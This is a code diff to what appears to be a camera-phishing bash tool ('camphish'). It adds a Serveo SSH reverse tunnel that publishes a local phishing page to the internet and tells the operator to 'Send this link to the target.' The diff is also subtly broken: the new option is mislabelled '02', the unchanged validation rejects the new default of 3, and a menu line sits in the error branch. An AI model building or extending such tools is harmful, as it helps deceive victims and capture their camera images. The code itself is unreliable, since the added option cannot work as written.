@@ -464,12 +464,23 @@ camphish() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
+start_serveo() {
+    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} Starting Serveo Tunnel..."
+    { sleep 1; setup_site; }
+    ssh -R "80:localhost:3333" serveo.net > .serveo.log 2>&1 &
+    sleep 10  # Wait for tunnel to initialize
 
+    # Extract Serveo URL from the log
+    SERVEO_URL=$(grep -o "https://[a-z0-9]*\.serveo\.net" .serveo.log)
+    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} URL: ${SERVEO_URL}"
+    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} Send this link to the target."
+}
 printf "\n-----Choose tunnel server----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
-default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo\e[0m\n"
+default_option_server="3"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 3] \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 select_template
 
@@ -477,6 +488,8 @@ if [[ $option_server -eq 2 ]]; then
 cloudflare_tunnel
 elif [[ $option_server -eq 1 ]]; then
 ngrok_server
+elif [[ $option_server -eq 3 ]]; then
+start_serveo
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
@@ -487,6 +500,7 @@ fi
 
 select_template() {
 if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
+echo -e "${GREEN}[${WHITE}3${GREEN}]${CYAN} Serveo"  # New option
 printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
 sleep 1
 clear
